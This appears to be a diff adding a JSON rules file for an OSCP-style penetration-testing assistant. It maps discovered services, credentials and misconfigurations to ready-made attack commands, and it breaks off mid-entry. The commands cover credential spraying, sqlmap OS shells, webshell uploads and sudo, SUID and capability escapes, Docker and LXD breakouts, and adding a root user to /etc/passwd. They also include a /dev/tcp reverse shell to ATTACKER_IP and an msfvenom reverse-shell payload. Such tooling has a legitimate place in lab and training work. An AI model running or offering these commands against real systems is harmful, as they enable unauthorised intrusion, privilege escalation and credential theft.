@@ -1,0 +1,968 @@
+[
+    {
+        "_comment": "=== CREDENTIAL REUSE (highest priority - instant wins) ===",
+        "name": "Credential Reuse on Login Service",
+        "priority": 98,
+        "triggers": [
+            { "id": 1, "entity_type": "credential", "name_match": { "type": "regex", "value": ".*" }, "host_scope": "any_host" },
+            { "id": 2, "entity_type": "service", "name_match": { "type": "regex", "value": "(ssh|ftp|rdp|ms-wbt-server|winrm|smb|microsoft-ds)" } }
+        ],
+        "suggestion": {
+            "description": "Credential for '{trigger.1.name}' can be tested against '{trigger.2.name}' on {trigger.2.host}:{trigger.2.port}.",
+            "rationale": "Credential reuse is the highest-yield attack in OSCP labs. Always spray found credentials against every login service.",
+            "commands": [
+                "crackmapexec {trigger.2.name} {trigger.2.host} -u '{trigger.1.name}' -p '{trigger.1.attributes.password}'",
+                "For SSH: ssh {trigger.1.name}@{trigger.2.host}",
+                "For WinRM: evil-winrm -i {trigger.2.host} -u '{trigger.1.name}' -p '{trigger.1.attributes.password}'",
+                "If hash available ('{trigger.1.attributes.hash}'): crackmapexec smb {trigger.2.host} -u '{trigger.1.name}' -H '{trigger.1.attributes.hash}'"
+            ]
+        }
+    },
+    {
+        "name": "Credential Reuse on Web Login Page",
+        "priority": 95,
+        "triggers": [
+            { "id": 1, "entity_type": "credential", "name_match": { "type": "regex", "value": ".*" }, "host_scope": "any_host" },
+            { "id": 2, "entity_type": "web_content", "name_match": { "type": "regex", "value": "(login|signin|auth|admin|user|account|portal|wp-login)" } }
+        ],
+        "suggestion": {
+            "description": "Credential for '{trigger.1.name}' can be tested on web login '{trigger.2.name}' at {trigger.2.host}:{trigger.2.port}.",
+            "rationale": "Web login portals are often the initial foothold. Test every discovered credential against every login form.",
+            "commands": [
+                "Browse to: http://{trigger.2.host}:{trigger.2.port}{trigger.2.name}",
+                "Try user '{trigger.1.name}' with password '{trigger.1.attributes.password}'",
+                "If WordPress: use wp-login.php with these credentials"
+            ]
+        }
+    },
+    {
+        "name": "Credential Access to SMB Share",
+        "priority": 92,
+        "triggers": [
+            { "id": 1, "entity_type": "credential", "name_match": { "type": "regex", "value": ".*" }, "host_scope": "any_host" },
+            { "id": 2, "entity_type": "share", "name_match": { "type": "regex", "value": ".*" } }
+        ],
+        "suggestion": {
+            "description": "Credential '{trigger.1.name}' can be used to access SMB share '{trigger.2.name}' on {trigger.2.host}.",
+            "rationale": "Authenticated SMB access often reveals sensitive files, scripts, config files, or writable shares that enable further attacks.",
+            "commands": [
+                "smbclient //{trigger.2.host}/'{trigger.2.name}' -U '{trigger.1.name}%{trigger.1.attributes.password}'",
+                "crackmapexec smb {trigger.2.host} -u '{trigger.1.name}' -p '{trigger.1.attributes.password}' --shares",
+                "Look for: config files, scripts, credentials, writable directories"
+            ]
+        }
+    },
+
+    {
+        "_comment": "=== SQL INJECTION ===",
+        "name": "SQL Injection to OS Shell",
+        "priority": 96,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "vulnerability", "name_match": { "type": "contains", "value": "sql_injection" } }
+        ],
+        "suggestion": {
+            "description": "Confirmed SQL injection on {trigger.1.host}:{trigger.1.port} via '{trigger.1.attributes.parameter}' ({trigger.1.attributes.method}). Escalate to OS shell.",
+            "rationale": "SQL injection is a confirmed vulnerability. Escalate to OS-level command execution via file writes or direct OS commands.",
+            "commands": [
+                "sqlmap -u '{trigger.1.attributes.url}' -p '{trigger.1.attributes.parameter}' --os-shell",
+                "sqlmap -u '{trigger.1.attributes.url}' -p '{trigger.1.attributes.parameter}' --file-write=shell.php --file-dest=/var/www/html/shell.php",
+                "If MSSQL: sqlmap -u '{trigger.1.attributes.url}' --os-cmd='whoami'",
+                "Dump credentials: sqlmap -u '{trigger.1.attributes.url}' -p '{trigger.1.attributes.parameter}' --passwords"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html"]
+        }
+    },
+
+    {
+        "_comment": "=== KNOWN EXPLOITS ===",
+        "name": "Known Vulnerable Software with Public Exploit",
+        "priority": 93,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "software_product", "name_match": { "type": "regex", "value": ".*" } },
+            { "id": 2, "entity_type": "vulnerability", "name_match": { "type": "contains", "value": "EDB-ID" } }
+        ],
+        "suggestion": {
+            "description": "'{trigger.1.name}' ({trigger.1.version}) on {trigger.1.host}:{trigger.1.port} has a public exploit: {trigger.2.name}",
+            "rationale": "Public exploits from Exploit-DB are often directly usable. This is a high-confidence attack vector.",
+            "commands": [
+                "searchsploit '{trigger.1.name} {trigger.1.version}'",
+                "searchsploit -m <EDB-ID> (copy exploit locally)",
+                "Review exploit, modify target IP/port, and execute"
+            ],
+            "references": ["https://www.exploit-db.com/"]
+        }
+    },
+    {
+        "name": "Known Vulnerable Software with GitHub Exploit",
+        "priority": 89,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "software_product", "name_match": { "type": "regex", "value": ".*" } },
+            { "id": 2, "entity_type": "vulnerability", "name_match": { "type": "contains", "value": "GitHub Exploit" } }
+        ],
+        "suggestion": {
+            "description": "'{trigger.1.name}' ({trigger.1.version}) on {trigger.1.host}:{trigger.1.port} has a GitHub exploit: {trigger.2.name}",
+            "rationale": "GitHub exploit repos often contain ready-to-use PoC code. Review the repository, check stars/recency, and test.",
+            "commands": [
+                "git clone {trigger.2.attributes.url}",
+                "Review README.md for usage instructions",
+                "Modify exploit for target IP {trigger.1.host}:{trigger.1.port} and execute"
+            ]
+        }
+    },
+
+    {
+        "_comment": "=== WEB APPLICATION ATTACKS ===",
+        "name": "WordPress Detected - Run WPScan",
+        "priority": 82,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "software_product", "name_match": { "type": "exact", "value": "WordPress" } }
+        ],
+        "suggestion": {
+            "description": "WordPress {trigger.1.version} detected on {trigger.1.host}:{trigger.1.port}. Run WPScan for vulnerabilities and user enumeration.",
+            "rationale": "WordPress is extremely common in OSCP/PG labs. WPScan can find vulnerable plugins/themes, enumerate users, and brute-force logins.",
+            "commands": [
+                "wpscan --url http://{trigger.1.host}:{trigger.1.port}/ --enumerate ap,at,u --plugins-detection aggressive",
+                "wpscan --url http://{trigger.1.host}:{trigger.1.port}/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin",
+                "Check for known WP version vulns: searchsploit 'wordpress {trigger.1.version}'"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html"]
+        }
+    },
+    {
+        "name": "Sensitive Backup File Discovered",
+        "priority": 88,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "web_content", "name_match": { "type": "regex", "value": "\\.(bak|old|backup|copy|save|orig|sql|zip|tar\\.gz|tgz|7z|rar)$" } }
+        ],
+        "suggestion": {
+            "description": "Backup/archive file '{trigger.1.name}' found on {trigger.1.host}:{trigger.1.port}. Download and inspect for credentials or source code.",
+            "rationale": "Backup files often contain database credentials, hardcoded passwords, API keys, or source code that reveals additional attack vectors.",
+            "commands": [
+                "wget http://{trigger.1.host}:{trigger.1.port}{trigger.1.name} -O loot_backup",
+                "If archive: unzip/tar/7z and search for passwords: grep -ri 'password\\|passwd\\|secret\\|key\\|token' .",
+                "If .sql: look for INSERT INTO users, CREATE USER, or GRANT statements",
+                "If .bak of PHP/config: look for database connection strings"
+            ]
+        }
+    },
+    {
+        "name": "Configuration or Credential File Exposed",
+        "priority": 91,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "web_content", "name_match": { "type": "regex", "value": "(\\.env|\\.git|config\\.php|web\\.config|wp-config|database\\.yml|settings\\.py|credentials|htpasswd|\\.ssh)" } }
+        ],
+        "suggestion": {
+            "description": "Sensitive file '{trigger.1.name}' exposed on {trigger.1.host}:{trigger.1.port}. This may contain credentials or secrets.",
+            "rationale": "Exposed config files are a goldmine in OSCP labs. They commonly contain database passwords, API keys, and service credentials.",
+            "commands": [
+                "curl -s http://{trigger.1.host}:{trigger.1.port}{trigger.1.name}",
+                "If .git: git-dumper http://{trigger.1.host}:{trigger.1.port}/.git/ ./git-dump",
+                "If .env/config: extract DB_PASSWORD, DB_USER, SECRET_KEY, API_KEY values",
+                "If .htpasswd: crack hashes with john or hashcat"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/git-leak.html"]
+        }
+    },
+    {
+        "name": "File Upload Endpoint Discovered",
+        "priority": 86,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "web_content", "name_match": { "type": "regex", "value": "(upload|file.*upload|attach|import|media)" } }
+        ],
+        "suggestion": {
+            "description": "Upload endpoint '{trigger.1.name}' found on {trigger.1.host}:{trigger.1.port}. Attempt to upload a reverse shell.",
+            "rationale": "File upload functionality is a common foothold vector. Try uploading PHP/ASP/JSP shells, bypass extension filters, and find the uploaded file location.",
+            "commands": [
+                "Browse to http://{trigger.1.host}:{trigger.1.port}{trigger.1.name}",
+                "Try uploading a PHP shell: cp /usr/share/webshells/php/php-reverse-shell.php shell.php",
+                "If filtered: try shell.php.jpg, shell.pHp, shell.php%00.jpg, or add GIF89a header",
+                "Locate uploaded file: check /uploads/, /media/, /files/, or response headers"
+            ]
+        }
+    },
+    {
+        "name": "Directory Indexing Enabled",
+        "priority": 72,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "misconfiguration", "name_match": { "type": "exact", "value": "directory_indexing_found" } }
+        ],
+        "suggestion": {
+            "description": "Directory indexing is enabled on {trigger.1.host}:{trigger.1.port}. Browse for sensitive files.",
+            "rationale": "Directory listings expose file structure and may reveal backup files, credentials, or hidden functionality not found by directory brute-forcing.",
+            "commands": [
+                "Browse to: http://{trigger.1.host}:{trigger.1.port}{trigger.1.attributes.url_path_nikto}",
+                "Look for: .bak, .old, .sql, .zip, .config files, scripts, and subdirectories",
+                "Download anything interesting: wget -r --no-parent http://{trigger.1.host}:{trigger.1.port}{trigger.1.attributes.url_path_nikto}"
+            ]
+        }
+    },
+    {
+        "name": "Dangerous HTTP Methods Enabled",
+        "priority": 78,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "misconfiguration", "name_match": { "type": "exact", "value": "http_methods_revealed" } }
+        ],
+        "suggestion": {
+            "description": "Dangerous HTTP methods (PUT/DELETE/TRACE) are enabled on {trigger.1.host}:{trigger.1.port}.",
+            "rationale": "PUT allows file upload directly via HTTP. TRACE can enable XSS via cross-site tracing. These are quick wins if exploitable.",
+            "commands": [
+                "Test PUT upload: curl -X PUT http://{trigger.1.host}:{trigger.1.port}/shell.php -d '<?php system($_GET[\"cmd\"]); ?>'",
+                "Test with Davtest: davtest --url http://{trigger.1.host}:{trigger.1.port}/",
+                "If WebDAV: cadaver http://{trigger.1.host}:{trigger.1.port}/"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/put-method-webdav.html"]
+        }
+    },
+    {
+        "name": "Robots.txt Discovered - Check Disallowed Paths",
+        "priority": 60,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "web_content", "name_match": { "type": "exact", "value": "/robots.txt" } }
+        ],
+        "suggestion": {
+            "description": "robots.txt found on {trigger.1.host}:{trigger.1.port}. Check for hidden paths.",
+            "rationale": "robots.txt disallowed entries often reveal admin panels, sensitive directories, or hidden functionality.",
+            "commands": [
+                "curl -s http://{trigger.1.host}:{trigger.1.port}/robots.txt",
+                "Manually browse each Disallow: path",
+                "Run gobuster on discovered directories for deeper enumeration"
+            ]
+        }
+    },
+
+    {
+        "_comment": "=== NETWORK SERVICE ATTACKS ===",
+        "name": "FTP Service - Check Anonymous Login",
+        "priority": 80,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "service", "name_match": { "type": "exact", "value": "ftp" } }
+        ],
+        "suggestion": {
+            "description": "FTP on {trigger.1.host}:{trigger.1.port}. Check for anonymous login and writable directories.",
+            "rationale": "Anonymous FTP is extremely common in OSCP/PG labs and can expose files or allow webshell upload.",
+            "commands": [
+                "ftp {trigger.1.host} {trigger.1.port} (login: anonymous / password: blank)",
+                "nmap --script ftp-anon,ftp-bounce,ftp-syst -p {trigger.1.port} {trigger.1.host}",
+                "If writable: put shell.php (check if FTP root overlaps with web root)"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp/index.html"]
+        }
+    },
+    {
+        "name": "FTP and Web Server on Same Host - Webshell via FTP",
+        "priority": 90,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "service", "name_match": { "type": "exact", "value": "ftp" } },
+            { "id": 2, "entity_type": "service", "name_match": { "type": "regex", "value": "(http|https)" } }
+        ],
+        "suggestion": {
+            "description": "FTP ({trigger.1.port}) and web server ({trigger.2.name} on {trigger.2.port}) both on {trigger.1.host}. If FTP is writable and shares the web root, upload a webshell.",
+            "rationale": "A classic OSCP pattern: FTP anonymous write + web server = upload PHP/ASP shell via FTP, trigger via web browser.",
+            "commands": [
+                "ftp {trigger.1.host} (test anonymous login)",
+                "put /usr/share/webshells/php/php-reverse-shell.php shell.php",
+                "Trigger: curl http://{trigger.1.host}:{trigger.2.port}/shell.php",
+                "If different web root, try common paths: /var/www/html/, /srv/http/, /inetpub/wwwroot/"
+            ]
+        }
+    },
+    {
+        "name": "Anonymous FTP Misconfiguration Confirmed",
+        "priority": 91,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "misconfiguration", "name_match": { "type": "regex", "value": "(ftp.*anon|anon.*ftp|ftp-anon)" } }
+        ],
+        "suggestion": {
+            "description": "Anonymous FTP confirmed on {trigger.1.host}:{trigger.1.port} via NSE script.",
+            "rationale": "Nmap confirmed anonymous FTP login. Enumerate for sensitive files and check if writable.",
+            "commands": [
+                "ftp {trigger.1.host} (login as 'anonymous')",
+                "ls -la && find writable directories",
+                "Download everything: wget -r ftp://anonymous:@{trigger.1.host}/",
+                "Search for passwords: grep -ri 'password\\|passwd\\|credential' ."
+            ]
+        }
+    },
+    {
+        "name": "SMB Service - Enumerate Shares and Users",
+        "priority": 70,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "service", "name_match": { "type": "regex", "value": "(smb|microsoft-ds|netbios-ssn)" } }
+        ],
+        "suggestion": {
+            "description": "SMB on {trigger.1.host}:{trigger.1.port}. Enumerate shares, users, and check for null session.",
+            "rationale": "SMB null/guest sessions reveal usernames, shares, and password policies critical for further attacks.",
+            "commands": [
+                "enum4linux-ng -A {trigger.1.host}",
+                "smbclient -L //{trigger.1.host}/ -N",
+                "crackmapexec smb {trigger.1.host} -u '' -p '' --shares --users",
+                "crackmapexec smb {trigger.1.host} -u 'guest' -p '' --shares"
+            ]
+        }
+    },
+    {
+        "name": "SNMP Exposed - Extract System Intelligence",
+        "priority": 73,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "os_details", "name_match": { "type": "exact", "value": "snmp_system_information" } }
+        ],
+        "suggestion": {
+            "description": "SNMP system information disclosed on {trigger.1.host}. Use extracted data for targeted attacks.",
+            "rationale": "SNMP can expose running processes (revealing software versions), local users, network configuration, and installed software.",
+            "commands": [
+                "Review extracted data: users, processes, interfaces from SNMP",
+                "Cross-reference discovered users with password spraying",
+                "Cross-reference running processes with searchsploit for known exploits",
+                "snmpwalk -v2c -c public {trigger.1.host} NET-SNMP-EXTEND-MIB::nsExtendOutputFull (check for command execution)"
+            ]
+        }
+    },
+    {
+        "name": "Password Spray Discovered Users Against Services",
+        "priority": 83,
+        "host_scope": "any_host",
+        "triggers": [
+            { "id": 1, "entity_type": "user", "name_match": { "type": "regex", "value": ".*" } },
+            { "id": 2, "entity_type": "service", "name_match": { "type": "regex", "value": "(ssh|ftp|rdp|ms-wbt-server|winrm|smb|microsoft-ds)" } }
+        ],
+        "suggestion": {
+            "description": "User '{trigger.1.name}' discovered. Try password spraying against '{trigger.2.name}' on {trigger.2.host}:{trigger.2.port}.",
+            "rationale": "Discovered usernames should be sprayed against all login services with common passwords and username-as-password variations.",
+            "commands": [
+                "crackmapexec {trigger.2.name} {trigger.2.host} -u '{trigger.1.name}' -p '{trigger.1.name}' (username as password)",
+                "crackmapexec {trigger.2.name} {trigger.2.host} -u '{trigger.1.name}' -p Password1,Welcome1,{trigger.1.name}123",
+                "hydra -l '{trigger.1.name}' -P /usr/share/wordlists/rockyou.txt {trigger.2.host} {trigger.2.name} -t 4"
+            ]
+        }
+    },
+    {
+        "name": "Discovered User with Weak Password Policy",
+        "priority": 85,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "user", "name_match": { "type": "regex", "value": ".*" } },
+            { "id": 2, "entity_type": "misconfiguration", "name_match": { "type": "exact", "value": "password_policy_details" } }
+        ],
+        "suggestion": {
+            "description": "User '{trigger.1.name}' found on host with weak password policy. Password spraying is highly viable.",
+            "rationale": "A weak or absent password policy (short min length, no complexity, no lockout) makes password spraying very effective.",
+            "commands": [
+                "crackmapexec smb {trigger.1.host} -u '{trigger.1.name}' -p '{trigger.1.name}' (username as password)",
+                "crackmapexec smb {trigger.1.host} -u '{trigger.1.name}' -p Password1,Welcome1,Company123,Summer2024",
+                "Note: check lockout policy first to avoid locking accounts"
+            ]
+        }
+    },
+    {
+        "name": "SMB Share Accessible - Enumerate for Sensitive Files",
+        "priority": 74,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "share", "name_match": { "type": "regex", "value": ".*" } }
+        ],
+        "suggestion": {
+            "description": "SMB share '{trigger.1.name}' discovered on {trigger.1.host}. Enumerate for sensitive files.",
+            "rationale": "Non-default shares often contain scripts, backups, credentials, or deployment files with hardcoded passwords.",
+            "commands": [
+                "smbclient //{trigger.1.host}/'{trigger.1.name}' -N (try null session)",
+                "smbmap -H {trigger.1.host} -r '{trigger.1.name}'",
+                "Look for: .ps1, .bat, .vbs scripts, .xml config files, .txt notes, .bak backups",
+                "Download all: smbclient //{trigger.1.host}/'{trigger.1.name}' -N -c 'recurse ON; prompt OFF; mget *'"
+            ]
+        }
+    },
+    {
+        "name": "Virtual Host Discovered - Enumerate Further",
+        "priority": 68,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "virtual_host", "name_match": { "type": "regex", "value": ".*" } }
+        ],
+        "suggestion": {
+            "description": "Virtual host '{trigger.1.name}' found on {trigger.1.host}. Add to /etc/hosts and enumerate.",
+            "rationale": "Virtual hosts often serve completely different web applications. Each one is a new attack surface.",
+            "commands": [
+                "echo '{trigger.1.host} {trigger.1.name}' >> /etc/hosts",
+                "Browse to: http://{trigger.1.name}/",
+                "gobuster dir -u http://{trigger.1.name}/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt",
+                "nikto -h http://{trigger.1.name}/"
+            ]
+        }
+    },
+
+    {
+        "_comment": "=== LINUX PRIVILEGE ESCALATION ===",
+        "name": "Sudo Misconfiguration - GTFOBins Escalation",
+        "priority": 94,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "sudo_nopasswd_privileges" } }
+        ],
+        "suggestion": {
+            "description": "Sudo NOPASSWD privileges on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "sudo -l with NOPASSWD is the #1 Linux privesc vector in OSCP. Almost any binary can be abused via GTFOBins.",
+            "commands": [
+                "sudo -l (verify exact commands)",
+                "Check every allowed binary on https://gtfobins.github.io/#+sudo",
+                "Common wins: sudo vim -c ':!/bin/sh', sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
+                "sudo find / -exec /bin/sh \\; -quit",
+                "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
+                "If (ALL) NOPASSWD: ALL → sudo su"
+            ],
+            "references": ["https://gtfobins.github.io/#+sudo"]
+        }
+    },
+    {
+        "name": "Outdated Sudo Version - CVE Exploit",
+        "priority": 93,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "outdated_sudo_version" } }
+        ],
+        "suggestion": {
+            "description": "Outdated sudo version detected on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "Older sudo versions have critical CVEs: CVE-2021-3156 (Baron Samedit) affects sudo < 1.9.5p2, CVE-2019-14287 affects sudo < 1.8.28.",
+            "commands": [
+                "sudo --version (check exact version)",
+                "CVE-2021-3156 (sudo < 1.9.5p2): sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')",
+                "CVE-2019-14287 (sudo < 1.8.28): sudo -u#-1 /bin/bash",
+                "searchsploit sudo (find version-specific exploits)"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version"]
+        }
+    },
+    {
+        "name": "SUID Binary - GTFOBins / Custom Binary Exploitation",
+        "priority": 92,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "suid_binary_found" } }
+        ],
+        "suggestion": {
+            "description": "SUID binary found on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "SUID binaries run with owner privileges (often root). Check GTFOBins for known exploits, or analyze custom binaries for command injection / path hijacking.",
+            "commands": [
+                "find / -perm -4000 -type f 2>/dev/null",
+                "Check each on https://gtfobins.github.io/#+suid",
+                "For custom binaries: strings <binary> | grep -i 'system\\|exec\\|popen\\|/bin'",
+                "ltrace <binary> (trace library calls - look for system() calls)",
+                "If it calls a relative command: PATH=/tmp:$PATH (path hijacking)"
+            ],
+            "references": ["https://gtfobins.github.io/#+suid"]
+        }
+    },
+    {
+        "name": "GUID Binary Found",
+        "priority": 78,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "guid_binary_found" } }
+        ],
+        "suggestion": {
+            "description": "GUID binary found on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "GUID binaries run with group privileges. Less common than SUID but can still provide escalation to privileged groups.",
+            "commands": [
+                "find / -perm -2000 -type f 2>/dev/null",
+                "Check https://gtfobins.github.io/ for abuse methods",
+                "id (check which group the GUID binary runs as)"
+            ]
+        }
+    },
+    {
+        "name": "Linux Capabilities - Escalation via Cap Abuse",
+        "priority": 87,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "process_capabilities_found" } }
+        ],
+        "suggestion": {
+            "description": "Process capabilities found on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "Linux capabilities like cap_setuid, cap_dac_override, cap_sys_admin allow privilege escalation without full SUID.",
+            "commands": [
+                "getcap -r / 2>/dev/null (list all capabilities)",
+                "If cap_setuid on python/perl/php: python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
+                "If cap_dac_override: read /etc/shadow directly",
+                "Check https://gtfobins.github.io/#+capabilities"
+            ],
+            "references": ["https://gtfobins.github.io/#+capabilities"]
+        }
+    },
+    {
+        "name": "Writable Cron Job - Command Injection",
+        "priority": 93,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "writable_cron_job" } }
+        ],
+        "suggestion": {
+            "description": "Writable cron job on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "Writable cron scripts running as root allow direct command injection for privilege escalation.",
+            "commands": [
+                "cat /etc/crontab && ls -la /etc/cron.* /var/spool/cron/",
+                "echo 'chmod +s /bin/bash' >> <WRITABLE_SCRIPT>",
+                "Wait for cron execution, then: /bin/bash -p",
+                "Alternative: echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' >> <WRITABLE_SCRIPT>"
+            ]
+        }
+    },
+    {
+        "name": "Writable /etc/passwd or /etc/shadow",
+        "priority": 96,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "writable_sensitive_file_etc_passwd_shadow" } }
+        ],
+        "suggestion": {
+            "description": "Writable /etc/passwd or /etc/shadow on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "Direct write access to /etc/passwd allows adding a root-equivalent user. Write access to /etc/shadow allows replacing the root password hash.",
+            "commands": [
+                "Generate password hash: openssl passwd -1 -salt hack password123",
+                "Add root user: echo 'hacker:$1$hack$WfhXHPz4GhGEI73TFCeeg0:0:0::/root:/bin/bash' >> /etc/passwd",
+                "su hacker (password: password123)",
+                "Or replace root hash in /etc/shadow if writable"
+            ]
+        }
+    },
+    {
+        "name": "Docker Socket Writable - Container Escape to Root",
+        "priority": 95,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "writable_docker_socket" } }
+        ],
+        "suggestion": {
+            "description": "Docker socket is writable on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "Access to the Docker socket is equivalent to root. Mount the host filesystem into a container to get full root access.",
+            "commands": [
+                "docker images (list available images)",
+                "docker run -v /:/mnt --rm -it <IMAGE> chroot /mnt sh",
+                "If no images: docker pull alpine && docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+                "Inside container: cat /mnt/root/root.txt (or add SSH key, SUID bash, etc.)"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation.html"]
+        }
+    },
+    {
+        "name": "LXD Group Membership - Container Escape to Root",
+        "priority": 93,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "lxd_privilege_escalation_possible" } }
+        ],
+        "suggestion": {
+            "description": "LXD group membership detected on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "LXD group membership allows creating privileged containers that mount the host filesystem, giving root access.",
+            "commands": [
+                "On attacker: git clone https://github.com/saghul/lxd-alpine-builder && ./build-alpine",
+                "Transfer alpine image to target",
+                "lxc image import ./alpine*.tar.gz --alias myimage",
+                "lxc init myimage mycontainer -c security.privileged=true",
+                "lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true",
+                "lxc start mycontainer && lxc exec mycontainer /bin/sh"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html"]
+        }
+    },
+    {
+        "name": "NFS no_root_squash - SUID Shell via NFS",
+        "priority": 91,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "nfs_no_root_squash" } }
+        ],
+        "suggestion": {
+            "description": "NFS no_root_squash on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "no_root_squash lets you write SUID binaries as root via NFS mount. Classic OSCP privesc.",
+            "commands": [
+                "showmount -e {trigger.1.host}",
+                "mkdir /tmp/nfs && mount -t nfs {trigger.1.host}:/<EXPORT> /tmp/nfs",
+                "cp /bin/bash /tmp/nfs/rootbash && chmod +s /tmp/nfs/rootbash",
+                "On target: ./rootbash -p (or /tmp/rootbash -p)"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.html"]
+        }
+    },
+    {
+        "name": "PEAS Highlighted Critical Finding (95% Exploitable)",
+        "priority": 90,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "peas_highlighted_finding_95_pwnable" } }
+        ],
+        "suggestion": {
+            "description": "LinPEAS/WinPEAS flagged a critical finding (red/yellow = 95% exploitable) on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "PEAS red/yellow highlights indicate findings the tool considers 95% likely to be exploitable. These deserve immediate investigation.",
+            "commands": [
+                "Review the finding: {trigger.1.attributes.description}",
+                "Search for exploitation guidance: searchsploit / GTFOBins / HackTricks",
+                "Cross-reference with other findings for a complete attack path"
+            ]
+        }
+    },
+
+    {
+        "_comment": "=== WINDOWS PRIVILEGE ESCALATION ===",
+        "name": "Unquoted Service Path - Binary Hijacking",
+        "priority": 88,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "unquoted_service_path" } }
+        ],
+        "suggestion": {
+            "description": "Unquoted service path on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "Windows resolves unquoted service paths with spaces by trying intermediate paths. If you can write to one of these locations, you can hijack the service.",
+            "commands": [
+                "Identify the unquoted path and check write permissions on intermediate directories",
+                "icacls 'C:\\Program Files\\Vulnerable App\\' (check write access)",
+                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe > Vulnerable.exe",
+                "Place payload in hijackable path location",
+                "Restart service: sc stop <SERVICE> && sc start <SERVICE> (or wait for reboot)"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#unquoted-service-paths"]
+        }
+    },
+    {
+        "name": "AlwaysInstallElevated - MSI Shell as SYSTEM",
+        "priority": 94,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "alwaysinstallelevated_registry_key" } }
+        ],
+        "suggestion": {
+            "description": "AlwaysInstallElevated enabled on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "When both HKLM and HKCU AlwaysInstallElevated keys are set, any user can install MSI packages as SYSTEM.",
+            "commands": [
